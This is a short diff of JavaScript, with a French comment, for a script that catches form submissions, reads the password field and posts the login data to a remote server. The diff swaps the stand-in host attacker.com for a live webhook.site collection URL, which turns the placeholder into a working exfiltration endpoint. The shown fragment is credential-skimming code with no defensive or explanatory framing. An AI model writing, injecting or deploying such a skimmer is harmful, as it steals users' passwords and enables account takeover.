@@ -7,7 +7,7 @@ document.addEventListener('submit', function(event) {
         let password = form.querySelector('input[name="password"]').value;
 
         // Envoie les données de connexion à un serveur distant
-        fetch('http://attacker.com/collect', {
+        fetch('https://webhook.site/49e19250-e4fd-4b9e-86dc-6a9a8d434b50', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
